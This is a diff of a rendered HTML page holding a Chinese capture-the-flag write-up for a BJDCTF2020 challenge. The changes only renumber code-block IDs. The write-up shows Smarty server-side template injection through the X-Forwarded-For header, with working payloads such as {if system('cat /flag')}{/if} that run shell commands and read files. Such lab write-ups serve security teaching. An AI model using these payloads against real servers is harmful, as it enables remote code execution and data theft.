@@ -3547,24 +3547,24 @@
 <h3 id="_1"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_1">题目概述</a></h3>
 <p>进入靶场只有两个链接：<code>flag</code> 和 <code>hint</code>。</p>
 <p><code>hint</code> 里没放东西。打开 <code>flag</code>，页面输出：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>Your IP is : 10.42.1.78
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Your IP is : 10.42.1.78
 </span></code></pre></div>
 <p><strong>问题来了：它怎么知道我的 IP 的？</strong></p>
 <hr />
 <h3 id="_2"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_2">解题过程</a></h3>
 <h4 id="step-1-ip-ip"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-1-ip-ip">Step 1：既然它读 IP，那就伪造 IP</a></h4>
 <p><strong>服务器判断"你的 IP"，通常看 <code>X-Forwarded-For</code> 这类头（反向代理会加）。所以先手动改一个试试：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-k</span> <span class="n">-H</span> <span class="s2">"X-Forwarded-For: TESTIP_9.9.9.9"</span> <span class="s2">"https://…:9999/flag.php"</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-k</span> <span class="n">-H</span> <span class="s2">"X-Forwarded-For: TESTIP_9.9.9.9"</span> <span class="s2">"https://…:9999/flag.php"</span>
 </span></code></pre></div>
 <p><strong>页面真的跟着变了 —— 说明这个头被原样拿来用。</strong></p>
 <p><strong>（这道题的平台给的是裸 TCP 地址，但它其实是个 HTTPS 服务，所以我直接用 <code>https://host:9999/</code> 访问，不需要 nc / openssl。）</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-2">Step 2：改完还能正常输出，那就试模板注入</a></h4>
 <p><strong>先上最基础的探针：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>X-Forwarded-For: {{7*7}}      →  49
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>X-Forwarded-For: {{7*7}}      →  49
 </span></code></pre></div>
 <p><strong>模板被执行了。</strong>但这一刻<strong>不要急着下结论</strong>。</p>
 <h4 id="step-377"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-377">Step 3：<code>{{7*'7'}}</code> 才是分水岭</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>X-Forwarded-For: {{7*'7'}}    →  49
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>X-Forwarded-For: {{7*'7'}}    →  49
 </span></code></pre></div>
 <p><strong>这个结果说明引擎把 <code>'7'</code> 当成数字处理了 —— 那是 PHP 系模板的行为。</strong></p>
 <table>
@@ -3586,59 +3586,59 @@
 </tbody>
 </table>
 <p><strong>所以这不是 Jinja2。看报错也印证了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>Uncaught --&gt; Smarty Compiler: Syntax error in template …
-</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>Uncaught --&gt; Smarty Compiler: Syntax error in template …
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php
 </span></code></pre></div>
 <p><strong><code>sysplugins/smarty_internal_*</code> 就是 Smarty 的源码目录。</strong></p>
 <blockquote>
 <p><strong>这一步我走了弯路：</strong>一开始按题名以为是 Flask 版，直接套 <code>__class__</code> 那条链，结果报错说 Smarty 语法不对。<strong>只测 <code>{{7*7}}</code> 是不够的 —— Jinja 和 Smarty 都回 49。</strong></p>
 </blockquote>
 <h4 id="step-4-smarty"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-4-smarty">Step 4：确认 Smarty 版本</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>X-Forwarded-For: {$smarty.version}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>X-Forwarded-For: {$smarty.version}
 </span></code></pre></div>
 <p><img alt="Smarty 版本" src="../../../assets/images/bjdctf2020-mystery-ip/01-smarty-version.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>Your IP is : 3.1.34-dev-7
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Your IP is : 3.1.34-dev-7
 </span></code></pre></div>
 <p><strong>Smarty 3.1。</strong>这意味着 Smarty 2 时代的 <code>{php}…{/php}</code> 标签<strong>已经被移除了</strong>，那条路走不通。</p>
 <h4 id="step-5smarty-3-if"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-5smarty-3-if">Step 5：Smarty 3 的路子是 <code>{if}</code></a></h4>
 <p><strong>Smarty 的 <code>{if}</code> 表达式最终会被编译成 PHP 的 <code>if (...)</code>，而表达式里的函数调用会被原样写进编译结果。</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="x">// {if phpinfo()}{/if}  编译后大致是：</span>
-</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="x">if (phpinfo()) { }</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="x">// {if phpinfo()}{/if}  编译后大致是：</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="x">if (phpinfo()) { }</span>
 </span></code></pre></div>
 <p><strong>所以先验证这条路通不通：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>X-Forwarded-For: {if phpinfo()}{/if}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>X-Forwarded-For: {if phpinfo()}{/if}
 </span></code></pre></div>
 <p><strong>成功返回了 phpinfo 页面。</strong></p>
 <h4 id="step-6"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-6">Step 6：先看环境，再读文件</a></h4>
 <p><strong>phpinfo 里翻两件事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>disable_functions   →  空        （system / exec 都没禁）
-</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>open_basedir        →  没设      （没有被限制目录）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>disable_functions   →  空        （system / exec 都没禁）
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>open_basedir        →  没设      （没有被限制目录）
 </span></code></pre></div>
 <p><strong>顺手看了环境变量，只有一个 <code>FLAG=not_flag</code>：</strong></p>
 <p><img alt="环境变量" src="../../../assets/images/bjdctf2020-mystery-ip/02-env-not-flag.png" /></p>
 <p><strong>这是干扰项，别信。</strong></p>
 <h4 id="step-7"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-7">Step 7：执行命令</a></h4>
 <p><strong>注意 <code>{if}</code> 只判断真假，不打印值。所以要挑"自己会 echo 出来"的函数。<code>system</code> 属于这类。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>X-Forwarded-For: {if system('ls /')}{/if}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>X-Forwarded-For: {if system('ls /')}{/if}
 </span></code></pre></div>
 <p><img alt="列根目录" src="../../../assets/images/bjdctf2020-mystery-ip/03-ls-root.png" /></p>
 <p><strong>根目录下有个 <code>flag</code>。</strong></p>
 <h4 id="step-8"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-8">Step 8：读出来</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>X-Forwarded-For: {if system('cat /flag')}{/if}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>X-Forwarded-For: {if system('cat /flag')}{/if}
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>页面显示 "Your IP is" → 改 X-Forwarded-For 验证伪造
-</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>  → 改完还正常输出 → 试 {{7*7}} 得 49 → 模板被执行
-</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a>    → {{7*'7'}} 也回 49 → 不是 Jinja2，是 PHP 系（Smarty）
-</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a>      → 报错里的 smarty_internal_*.php 印证
-</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>        → {$smarty.version} 得 3.1.34 → {php} 标签已移除
-</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a>          → {if phpinfo()}{/if} 成功 → {if} 里能调 PHP 函数
-</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a>            → 看 disable_functions / open_basedir → 都没限制
-</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a>              → {if system('ls /')}{/if} 看到 /flag
-</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a>                → {if system('cat /flag')}{/if} 拿到 flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>页面显示 "Your IP is" → 改 X-Forwarded-For 验证伪造
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>  → 改完还正常输出 → 试 {{7*7}} 得 49 → 模板被执行
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>    → {{7*'7'}} 也回 49 → 不是 Jinja2，是 PHP 系（Smarty）
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>      → 报错里的 smarty_internal_*.php 印证
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>        → {$smarty.version} 得 3.1.34 → {php} 标签已移除
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>          → {if phpinfo()}{/if} 成功 → {if} 里能调 PHP 函数
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>            → 看 disable_functions / open_basedir → 都没限制
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>              → {if system('ls /')}{/if} 看到 /flag
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>                → {if system('cat /flag')}{/if} 拿到 flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_4">漏洞原理</a></h4>
 <p><strong>① 输入来源不只是参数，还有请求头</strong></p>
@@ -3646,8 +3646,8 @@
 <p><strong>② 模板引擎把"表达式"编译成代码</strong></p>
 <p>Smarty 把 <code>{if 表达式}</code> 编译成 PHP 的 <code>if (表达式)</code>。<strong>只要表达式里允许出现函数调用，就等于允许执行 PHP 函数。</strong>这和 Jinja 的 <code>{{ }}</code> 能访问对象属性是同一类问题的不同表现。</p>
 <p><strong>③ <code>{if}</code> 只判真假，不打印值</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="x">if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到</span>
-</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="x">if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="x">if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白</span>
 </span></code></pre></div>
 <p><strong>所以要选"会输出"的函数</strong>（<code>phpinfo</code>、<code>system</code>、<code>readfile</code>、<code>print</code>），或者把返回值再套一层输出函数。</p>
 <h4 id="_5"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_5">关键知识点</a></h4>
